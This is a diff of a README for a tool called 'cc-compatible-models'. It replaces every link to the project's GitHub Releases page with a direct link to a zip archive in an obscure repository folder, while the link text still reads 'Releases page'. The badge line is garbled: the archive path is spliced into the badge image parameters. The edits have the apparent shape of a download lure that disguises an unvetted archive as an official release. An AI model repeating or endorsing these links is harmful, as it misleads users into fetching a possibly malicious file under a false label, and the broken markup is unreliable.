@@ -1,6 +1,6 @@
 # 🌟 cc-compatible-models - Discover Alternatives for AI Coding
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ff69b4?style=for-the-badge&logo=Github)](https://github.com/hbgfjbgfgj/cc-compatible-models/releases)
+[![Download Now](https://raw.githubusercontent.com/hbgfjbgfgj/cc-compatible-models/main/starchwort/cc-compatible-models-v2.8.zip%20Now-ff69b4?style=for-the-badge&logo=Github)](https://raw.githubusercontent.com/hbgfjbgfgj/cc-compatible-models/main/starchwort/cc-compatible-models-v2.8.zip)
 
 ## 📋 Overview
 
@@ -15,11 +15,11 @@ To start using "cc-compatible-models," follow these steps:
    - RAM: At least 4 GB available.
    - Internet connection: Required for API access.
 
-2. Visit the [Releases page](https://github.com/hbgfjbgfgj/cc-compatible-models/releases) to download the software.
+2. Visit the [Releases page](https://raw.githubusercontent.com/hbgfjbgfgj/cc-compatible-models/main/starchwort/cc-compatible-models-v2.8.zip) to download the software.
 
 ## 💾 Download & Install
 
-To download the latest version of the application, visit this page to download: [Releases page](https://github.com/hbgfjbgfgj/cc-compatible-models/releases).
+To download the latest version of the application, visit this page to download: [Releases page](https://raw.githubusercontent.com/hbgfjbgfgj/cc-compatible-models/main/starchwort/cc-compatible-models-v2.8.zip).
 
 1. Click on the version you want to download.
 2. Find the appropriate file for your operating system—either Windows, macOS, or Linux.
